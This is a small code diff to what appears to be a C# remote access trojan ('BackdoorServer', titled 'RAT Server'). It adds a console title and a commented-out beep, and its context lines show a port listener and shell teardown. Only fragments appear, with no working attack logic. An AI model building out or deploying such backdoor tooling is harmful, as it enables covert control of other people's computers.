@@ -39,6 +39,7 @@ namespace BackdoorServer
 
         public void StartServer()
         {
+            Console.Title = "RAT Server:" + port;
             try
             {
                 if (verbose) Console.WriteLine("Listening on port " + port);
@@ -229,6 +230,7 @@ namespace BackdoorServer
             outStream.Dispose();
             socket.Close();
             listener.Stop();
+            // Console.Beep(382, 500);
         }
 
         void CloseShell()
